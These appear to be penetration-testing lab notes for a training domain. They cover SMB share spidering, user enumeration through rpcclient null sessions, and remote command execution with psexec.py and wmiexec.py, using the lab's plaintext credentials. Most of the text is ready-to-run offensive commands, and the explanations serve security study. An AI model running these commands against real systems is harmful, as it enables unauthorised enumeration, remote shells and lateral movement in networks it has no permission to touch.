
### CrackMapExec or Netexec

The module `spider_plus` will dig through each readable share on the host and list all readable files.

```ruby
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

### Smbmap

#### SMBMap To Check Access

```ruby
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

#### Recursive List Of All Directories

```ruby
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```


## SMB NULL Session with rpcclient

```ruby
rpcclient -U "" -N 172.16.5.5
```

### Enumdomusers

```ruby
rpcclient $> enumdomusers
```

### RPCClient User Enumeration By RID

```ruby
rpcclient $> queryuser 0x457
```

Or for groups:

```ruby
rpcclient $> querygroup 0xff0
```

## Using psexec.py

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

```ruby
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

- **SMB Authentication:** The tool reaches out to the target IP (`172.16.5.125`) over **SMB (Port 445)** and authenticates using the provided `wley` credentials.
    
- **Share Access:** Because `wley` has local administrator privileges on that target, the tool is able to access the hidden `ADMIN$` share (which translates to `C:\Windows` on the target).
    
- **Service Creation:** `psexec.py` uploads a randomly named, compiled executable to that share. It then uses the Microsoft endpoint mapper to remotely create and start a Windows service that runs the uploaded executable.

## Using wmiexec.py

To connect to a host with wmiexec.py, we need credentials for a user with local administrator privileges.

```ruby
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

Instead of using the hidden `ADMIN$` share and creating a loud Windows Service like `psexec.py` does, `wmiexec.py` abuses **Windows Management Instrumentation (WMI)**.

It does not upload an executable to the target's hard drive. Instead, it sends instructions directly to the WMI service, telling it to temporarily spin up a command prompt (`cmd.exe`), run your command, capture the output, send the output back to you, and then kill the command prompt.

